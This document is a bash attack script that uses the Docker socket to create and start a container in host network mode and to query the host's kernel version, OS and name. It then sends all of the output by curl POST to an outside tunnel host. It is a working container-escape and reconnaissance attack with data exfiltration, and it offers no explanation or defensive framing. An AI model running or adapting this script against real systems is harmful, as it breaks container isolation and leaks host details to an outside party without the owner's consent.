#!/bin/bash
URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] BYPASS ATTEMPT: HOST NETWORK ---"
  # Instead of mounting files, we try to take over the host's network stack
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"NetworkMode":"host"}}' > /tmp/bypass.json
  
  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/bypass.json | cut -d'"' -f4)
  if [ -n "$ID" ]; then
    echo "Host Network Container Created: $ID"
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
    # Now we check the host's real IP and interfaces
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
      -d '{"AttachStdout":true,"Cmd":["ip","addr"]}'
  else
    echo "Network Mode Bypass Blocked"
  fi

  echo "--- [!] HOST CONFIG READ (NO RUN) ---"
  # Try to read information without creating a container
  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "Name|KernelVersion|OperatingSystem"
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
